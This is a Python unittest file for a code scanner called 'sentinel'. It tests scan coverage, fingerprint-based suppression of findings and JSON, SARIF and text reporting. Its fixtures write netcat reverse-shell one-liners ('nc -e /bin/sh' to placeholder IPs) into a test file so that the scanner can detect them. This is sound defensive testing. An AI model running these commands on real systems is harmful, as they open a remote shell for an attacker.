import json
import tempfile
import unittest
from pathlib import Path

from sentinel.reporting import render_json, render_sarif, render_text
from sentinel.scanner import scan_folder
from sentinel.sentinelignore import apply_ignore


class ScanReportingTests(unittest.TestCase):
    def test_coverage_and_specific_suppression(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.sh").write_text("nc -e /bin/sh 1.2.3.4 1234\nnc -e /bin/sh 5.6.7.8 1234\n")
            (root / "binary").write_bytes(b"\0" * 100)
            (root / "__pycache__").mkdir()
            (root / "__pycache__" / "hidden.py").write_text("x")
            report = scan_folder(root)
            findings = [f for f in report.findings if f.rule_id == "SIG-0002"]
            self.assertEqual(len(findings), 2)
            self.assertEqual(report.scanned_files, 1)
            self.assertEqual(report.binary_files, ["binary"])
            self.assertEqual(report.excluded_entries, ["__pycache__"])
            ignore = root / "outside-ignore"
            ignore.write_text(
                f"FINGERPRINT {findings[0].suppression_fingerprint()} exemple vérifié\n"
            )
            filtered = apply_ignore(report, ignore_file=ignore)
            self.assertEqual(len([f for f in filtered.findings if f.rule_id == "SIG-0002"]), 1)
            self.assertEqual(filtered.ignored_findings[0]["reason"], "exemple vérifié")
            data = json.loads(render_json(filtered))
            self.assertEqual(data["coverage"]["scanned_files"], 1)
            self.assertEqual(data["coverage"]["binary_files"], ["binary"])
            self.assertIn("check", data["findings"][0]["guidance"])
            self.assertEqual(data["ignored_findings"][0]["reason"], "exemple vérifié")
            text = render_text(filtered)
            self.assertIn("exemple vérifié", text)
            self.assertIn("à vérifier", text)
            sarif = json.loads(render_sarif(filtered))["runs"][0]
            self.assertEqual(sarif["properties"]["coverage"]["scanned_files"], 1)
            self.assertTrue(any("suppressions" in f for f in sarif["results"]))
            (root / "bad.sh").write_text("nc -e /bin/sh 9.9.9.9 1234\nnc -e /bin/sh 5.6.7.8 1234\n")
            changed = apply_ignore(scan_folder(root), ignore_file=ignore)
            self.assertEqual(len([f for f in changed.findings if f.rule_id == "SIG-0002"]), 2)

    def test_fingerprint_without_reason_is_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.sh").write_text("nc -e /bin/sh 1.2.3.4 1234\n")
            report = scan_folder(root)
            f = next(f for f in report.findings if f.rule_id == "SIG-0002")
            ignore = root / "ignore"
            ignore.write_text(f"FINGERPRINT {f.suppression_fingerprint()} 2026-10-27\n")
            self.assertEqual(
                len(apply_ignore(report, ignore_file=ignore).findings), len(report.findings)
            )
